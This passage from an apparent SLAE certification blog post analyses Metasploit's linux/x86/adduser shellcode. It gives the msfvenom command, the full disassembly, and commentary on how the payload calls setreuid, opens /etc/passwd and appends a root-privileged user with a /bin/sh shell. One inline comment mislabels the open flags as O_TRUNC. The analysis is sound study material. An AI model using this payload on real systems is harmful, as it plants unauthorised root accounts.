<p><code class="language-plaintext highlighter-rouge">ndisasm</code> is used to dissassemble the shellcode:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/3_adduser$ msfvenom -p linux/x86/adduser USER=slae PASS=slae | ndisasm -b32 - 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 91 bytes

00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E822000000        call dword 0x4d
0000002B  736C              jnc 0x99              -&gt; Start of username/password string
0000002D  61                popad                 ..
0000002E  653A417A          cmp al,[gs:ecx+0x7a]  ..
00000032  48                dec eax
00000033  3433              xor al,0x33
00000035  7970              jns 0xa7
00000037  58                pop eax
00000038  2F                das
00000039  7A65              jpe 0xa0
0000003B  7063              jo 0xa0
0000003D  3A30              cmp dh,[eax]
0000003F  3A30              cmp dh,[eax]
00000041  3A3A              cmp bh,[edx]
00000043  2F                das
00000044  3A2F              cmp ch,[edi]
00000046  62696E            bound ebp,[ecx+0x6e]
00000049  2F                das
0000004A  7368              jnc 0xb4
0000004C  0A598B            or bl,[ecx-0x75]
0000004F  51                push ecx
00000050  FC                cld
00000051  6A04              push byte +0x4
00000053  58                pop eax
00000054  CD80              int 0x80
00000056  6A01              push byte +0x1
00000058  58                pop eax
00000059  CD80              int 0x80
</code></pre></div></div>

<h2 id="stepping-through-the-shellcode-2">Stepping through the shellcode</h2>

<p><code class="language-plaintext highlighter-rouge">int setreuid(uid_t ruid, uid_t euid)</code></p>

<blockquote>
  <p>setreuid() can be used by daemon processes to change the identity of a process in order for the process to be used to run work on behalf of a user.</p>
</blockquote>

<p>The <code class="language-plaintext highlighter-rouge">setreuid</code> function is called so the program executes as root (of course, the user or process executing the shellcode must have privileges to do so). This is often used when the process itself doesn’t run as root but has privileges to do, for example if the SUID bit is set on the file.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>              <span class="c1">; ecx = 0</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ecx</span>              <span class="c1">; ebx = 0</span>
<span class="nf">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x46</span>          <span class="c1">; eax = 0x46 -&gt; sys_setreuid16</span>
<span class="nf">pop</span> <span class="nb">eax</span>
<span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">int open(const char *pathname, int flags)</code></p>

<p>A file descriptor is then created so the shellcode can write the new user into <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. The <code class="language-plaintext highlighter-rouge">open</code> function expects a pointer to the filename <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and the flags. The filename contains extra slashes so make it 4 bytes aligned. The extra slashes in the filename don’t change the behavior as Linux don’t care of there is a single slash or multiple ones.</p>

<p>Flags specify if the file should be opened as read-only, write-only, etc.</p>

<p>The list of flags is in the <code class="language-plaintext highlighter-rouge">fnctl.h</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define O_ACCMODE       00000003
#define O_RDONLY        00000000
#define O_WRONLY        00000001
#define O_RDWR          00000002
#define O_CREAT         00000100
#define O_EXCL          00000200
#define O_NOCTTY        00000400
#define O_TRUNC         00001000
#define O_APPEND        00002000
...
</code></pre></div></div>

<p>These values are encoded in octal base, so when we look at the disassembled code below for the <code class="language-plaintext highlighter-rouge">open</code> function, we see that the <code class="language-plaintext highlighter-rouge">$ecx</code> register contains the value 0x401 which translates to 2001 in octal base. Therefore the <code class="language-plaintext highlighter-rouge">O_WRONLY</code> and <code class="language-plaintext highlighter-rouge">O_APPEND</code> flags are used on <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x5</span>           <span class="c1">; eax = 0x5 -&gt; sys_open</span>
<span class="nf">pop</span> <span class="nb">eax</span>
<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>              <span class="c1">; ecx = 0</span>
<span class="nf">push</span> <span class="nb">ecx</span>                 <span class="c1">; null-terminate pathname string</span>
<span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x64777373</span>    <span class="c1">; /etc//passwd</span>
<span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x61702f2f</span>    <span class="c1">; [...]</span>
<span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x6374652f</span>    <span class="c1">; [...]</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>              <span class="c1">; const char *pathname -&gt; /etc//passwd</span>
<span class="nf">inc</span> <span class="nb">ecx</span>                  <span class="c1">; ecx = 0x1</span>
<span class="nf">mov</span> <span class="nb">ch</span><span class="p">,</span><span class="mh">0x4</span>               <span class="c1">; ecx = 0x401, int flags -&gt; O_TRUNC + O_WRONLY</span>
<span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>

<p>The next bit of code pushes on the stack the memory address of new <code class="language-plaintext highlighter-rouge">/etc/passwd</code> line that’ll get added. Then the code jumps further down in the code.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">xchg</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">ebx</span>             <span class="c1">; eax = */etc//passwd, ebx = 3</span>
<span class="nf">call</span> <span class="kt">dword</span> <span class="mh">0x4d</span>          <span class="c1">; put username entry on the stack</span>
</code></pre></div></div>

<p>The code lands here, where the <code class="language-plaintext highlighter-rouge">write</code> function is called to add the username into the file.</p>

<p><code class="language-plaintext highlighter-rouge">write(int fd, const void *buf, size_t count)</code></p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">pop</span> <span class="nb">ecx</span>                       <span class="c1">; username entry: slae:AzH43ypX/zepc...</span>
<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>  <span class="c1">; len</span>
<span class="nf">push</span> <span class="mh">0x4</span>                      <span class="c1">; eax = 0x4 -&gt; sys_write</span>
<span class="nf">pop</span> <span class="nb">eax</span>
<span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>

<p>Then finally, the program exits:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">push</span> <span class="mh">0x1</span>                 <span class="c1">; eax = 0x1 -&gt; sys_exit</span>
<span class="nf">pop</span> <span class="nb">eax</span>
<span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>

<hr />

<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>

<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>

<p>Student ID: SLAE-1236</p>

<p>All source files can be found on GitHub at <a href="https://github.com/slemire/slae32">https://github.com/slemire/slae32</a></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#assembly" class="page__taxonomy-item" rel="tag">assembly</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#encoding" class="page__taxonomy-item" rel="tag">encoding</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#slae" class="page__taxonomy-item" rel="tag">slae</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#slae" class="page__taxonomy-item" rel="tag">slae</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-11-29T00:00:00+01:00">November 29, 2018</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-smasher/" class="pagination--pager" title="Smasher - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-hawk/" class="pagination--pager" title="Hawk - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
